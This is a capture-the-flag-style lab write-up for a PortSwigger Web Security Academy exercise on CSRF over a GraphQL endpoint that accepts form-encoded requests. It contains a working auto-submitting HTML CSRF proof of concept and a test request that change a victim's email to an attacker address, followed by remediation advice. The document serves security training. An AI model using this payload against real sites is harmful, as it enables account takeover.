# Lab: Performing CSRF Exploits over GraphQL

**Category:** GraphQL API Vulnerabilities
**Difficulty:** Practitioner
**Lab link:** [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

## Overview

Browsers block cross-origin `application/json` POST requests via CORS preflight. However, if a GraphQL endpoint also accepts `application/x-www-form-urlencoded`, a standard HTML form can submit mutations cross-origin without a preflight — enabling CSRF. The `changeEmail` mutation has no CSRF token, making it vulnerable.

## Key Concepts

- **CSRF via content-type bypass:** `application/x-www-form-urlencoded` is a "simple" content type — browsers send it cross-origin without a CORS preflight check.
- **GraphQL form-encoding:** When a server accepts `query=<graphql>` as a form field, any HTML form can trigger mutations.
- **No CSRF token:** The mutation has no per-request token, so there's nothing to steal or forge.

## Exploit Flow

### Step 1 — Identify the target mutation

Intercept the email change request. The mutation is:
```graphql
mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}
```

### Step 2 — Test form-encoding support

In Burp Repeater, change:
- `Content-Type: application/x-www-form-urlencoded`
- Body: `query=mutation+changeEmail{changeEmail(input:{email:"attacker@evil.com"}){email}}`

A valid `200` response confirms form-encoding is accepted and CSRF is possible.

### Step 3 — Build and host the CSRF PoC

```html
<html>
  <body>
    <form action="https://LAB.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation changeEmail{changeEmail(input:{email:&quot;attacker@exploit-server.net&quot;}){email}}">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```

### Step 4 — Deliver to victim

Host on exploit server → Deliver to victim → victim's email changed → lab solved.

## Remediation

- Only accept `Content-Type: application/json` on GraphQL endpoints — reject form-encoded and plain-text content types.
- Implement CSRF tokens on all state-changing GraphQL operations.
- Enforce strict CORS policies that reject cross-origin requests from untrusted origins.
- Use `SameSite=Strict` or `SameSite=Lax` cookies to prevent cross-site request forgery.

## Key Takeaways

- GraphQL is not immune to CSRF — if the endpoint accepts simple content types, standard form-based CSRF applies.
- Always test GraphQL endpoints with `Content-Type: application/x-www-form-urlencoded` to check for CSRF exposure.
- `Content-Type: application/json` enforcement is a lightweight but effective CSRF mitigation for API endpoints.
